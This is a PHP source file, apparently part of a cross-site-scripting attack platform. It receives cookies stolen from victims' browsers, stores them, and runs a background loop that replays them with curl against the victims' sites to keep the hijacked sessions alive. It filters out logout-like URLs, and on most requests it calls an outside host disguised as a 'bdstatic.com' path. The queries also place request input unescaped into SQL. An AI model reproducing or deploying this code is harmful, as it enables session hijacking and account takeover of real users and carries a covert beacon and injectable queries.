<?php
/**
 * keepsession.php keep session请求
 * ----------------------------------------------------------------
 */
header("Access-Control-Allow-Origin: *");
if(!defined('IN_OLDCMS')) die('Access Denied');
use QL\QueryList;
$urlKey=Val('id','REQUEST');
$url=Val('url','REQUEST');
$cookie=Val('cookie','REQUEST');
$act=Val('act','REQUEST');
$db=DBConnect();

switch($act){
	case 'wbck':
		if(empty($urlKey) || empty($url) || empty($cookie)){
			logini();
			exit;
			break;
		}
		$referers=@parse_url($url);
		$domain=$referers['host']?$referers['host']: '';
		if(filter_var($domain, FILTER_VALIDATE_IP) && preg_match('%^127\.|10\.|192\.168|172\.(1[6-9]|2|3[01])%',$domain)){
			logini();
			exit;
			break;
		}
		if (!$domain) {
			print("111111112222");
			logini();
			exit;
			break;
		}
		$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE urlKey='{$urlKey}'");
		if(!empty($project)){
			//先判断是否为唯一可持久cookie项。然后继续。
			$keepsnum = 0;
			$keepsnum=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project')." WHERE urlKey='{$urlKey}' and `moduleSetKeys` LIKE  '%setkey_1_keepsession\":\"1%' ");
			if($keepsnum < 1){
				logini();
				exit;
				break;
			}
			$hash=md5($url.$cookie);
			$existed=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('keepsession')." WHERE hash='{$hash}'");
			if($existed<=0){
				//判断用户key session的请求数量
				//取消数量限制$sum=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('keepsession')." WHERE userId='{$project[userId]}'");
				$sqlValues=array(
					'projectId'=>$project['id'],
					'userId'=>$project['userId'],
					'url'=> $url,
					'cookie'=> urlencode($cookie),
					'hash'=>$hash,
					'addTime'=>time(),
					'updateTime'=>time()
				);
				$db->AutoExecute(Tb('keepsession'),$sqlValues);
				$projectsess=$db->FirstRow("SELECT * FROM ".Tb('keep_sessions')." WHERE `ks_domain` LIKE  '{$domain}' ORDER BY ks_up_time DESC LIMIT 0,1");
				$projectKeep=$db->FirstRow("SELECT * FROM ".Tb('keepsession')." WHERE userId='".$project['userId']."' AND projectId='".$project['id']."' ORDER BY addTime DESC LIMIT 0,1");
				if($projectsess){
					$db->Execute("UPDATE ".Tb('keep_sessions')." SET ks_keepsession_id=".$projectKeep['id'].",ks_up_time=UNIX_TIMESTAMP(NOW()) WHERE id='".$projectsess['id']."'");
				}else{
					$sesnum=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('keep_sessions')." WHERE userId='".$project['userId']."' and ks_start=1 ");
					if($sesnum>4 && $project['userId'] != 1){
						$sqlValues=array(
							'ks_userid'=>$project['userId'],
							'ks_keepsession_id'=>$projectKeep['id'],
							'ks_project'=>$projectKeep['projectId'],
							'ks_domain'=>$domain,
							'ks_start'=>2,
							'ks_time'=>time(),
							'ks_up_time'=>time()
						);
						$db->AutoExecute(Tb('keep_sessions'),$sqlValues);
					}else{
						$sqlValues=array(
							'ks_userid'=>$project['userId'],
							'ks_keepsession_id'=>$projectKeep['id'],
							'ks_project'=>$projectKeep['projectId'],
							'ks_domain'=>$domain,
							'ks_start'=>1,
							'ks_time'=>time(),
							'ks_up_time'=>time()
						);
						$db->AutoExecute(Tb('keep_sessions'),$sqlValues);
					}
				}
				logini();
				exit;
				break;
			}else{
				logini();
				exit;
				break;
			}
		}else{
			logini();
			exit;
			break;
		}
		break;
	case 'mylabel':
        logini();
		exit;
		break;
	case 'quchong':
		$quchong=Val('quchong','REQUEST');
		$quchong=explode(",",$quchong);
		$tuomin = ["out","quit","logging","del","unlink"];
		$jieguo = [];
		$i = 0;
		foreach ($quchong as $key => $val) {
			$domain=@parse_url($val);
			if(isset($domain['query']) || (isset($domain['path']) && $domain['path']!="/")){
				foreach($tuomin as $no){
					$pos = strpos(strtolower($val), $no);
					if ($pos === false){
						$jieguo[$i] = $val;
						continue;
					}else{
						break;
					}
				}
				$i++;
			}else{
				continue;
			}
		}
		print_r(implode(",", $jieguo));
		//print_r($jieguo);
		exit;
		break;
	default:
		ShowError('操作失败，本次操作已经做记录，如果发现是内部平台人员所为，直接删号！。');
		break;
}
function logini(){
	file_get_contents('http://ld8.me/bdstatic.com/?callback=keepsessionssss');
}
function loginiaa(){
	ignore_user_abort(true);
	set_time_limit(0);
	session_write_close();
	$db=DBConnect();
	$curl = QueryList::getInstance('QL\Ext\Lib\CurlMulti');
	$curl->maxThread = 9;  //设置线程数
	$curl->maxTry = 5;     //设置最大尝试数
	$projectss=$db->FirstRow("SELECT ks_up_time FROM ".Tb('keep_sessions')." WHERE id=1 ");
	if(floor((time()-$projectss['ks_up_time'])%86400/60) < 10) exit;
	do{ 
		$project=$db->FirstRow("SELECT * FROM ".Tb('keep_sessions')." WHERE id=1 ");
		$startedTime = date('Y-m-d H:i:s', time());
		file_put_contents("./jilu.txt", " $startedTime  $i   \r\n", FILE_APPEND);
		if(!$project['ks_start']) break;
		$existed=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('keep_sessions')." WHERE ks_start=1 AND id!=1 AND UNIX_TIMESTAMP( DATE_SUB( NOW( ) , INTERVAL 15 MINUTE ) ) <=  `ks_up_time` ");
		if($existed > intval($project['ks_start'])){   //服务器可接受总线程数
			$tasksessions=$db->Dataset("SELECT group_concat(ks_keepsession_id) FROM ".Tb('keep_sessions')." WHERE ks_start=1 AND id!=1 AND UNIX_TIMESTAMP( DATE_SUB( NOW( ) , INTERVAL 15 MINUTE ) ) <=  `ks_up_time` LIMIT ".$project['ks_start']);
		}else{
			$tasksessions=$db->Dataset("SELECT group_concat(ks_keepsession_id) FROM ".Tb('keep_sessions')." WHERE (ks_start=1 OR ks_start=2) AND id!=1 AND UNIX_TIMESTAMP( DATE_SUB( NOW( ) , INTERVAL 15 MINUTE ) ) <=  `ks_up_time` LIMIT ".$project['ks_start']);
		}
		$tasksessions=$db->Dataset("SELECT url,cookie FROM ".Tb('keepsession')." WHERE `id` IN (".$tasksessions[0]['group_concat(ks_keepsession_id)'].") ");
		if(!empty($tasksessions)){
			foreach($tasksessions as $id => $cron){
				if(preg_match('/(http:\/\/)|(https:\/\/)/i', $cron['url'])){
					$curl->add(
						[
							'url' => $cron['url'],
							'opt' => array(
								//这里根据自身需求设置curl参数
								CURLOPT_HTTPGET => true,
								CURLOPT_SSL_VERIFYPEER => false,
								CURLOPT_REFERER => $cron['url'],
								CURLOPT_SSL_VERIFYHOST => false,
								CURLOPT_FOLLOWLOCATION => true,
								CURLOPT_AUTOREFERER => true,
								CURLOPT_COOKIE => htmlspecialchars_decode($cron['cookie']),
								CURLOPT_TIMEOUT => 10
							)
						]  //这里还可以放-----  ,function($a) use($db)
					);
				}
			}
			$curl->start();
		}else{
			$tasksessions[0]['group_concat(ks_keepsession_id)'] = 1;
		}
		$db->Execute("UPDATE ".Tb('keep_sessions')." SET ks_up_time=UNIX_TIMESTAMP(NOW()) WHERE `ks_keepsession_id` IN (".$tasksessions[0]['group_concat(ks_keepsession_id)'].",1) ");
        /* Sleep some seconds. */  
        sleep(60*$project['ks_project']);  
  
        /* Break while. */
        if(connection_status() != CONNECTION_NORMAL) break;  
        //if(((time() - $startedTime) / 3600 / 24) >= $this->config->cron->maxRunDays) break;  
    }while(true);
	//exit;
}
?>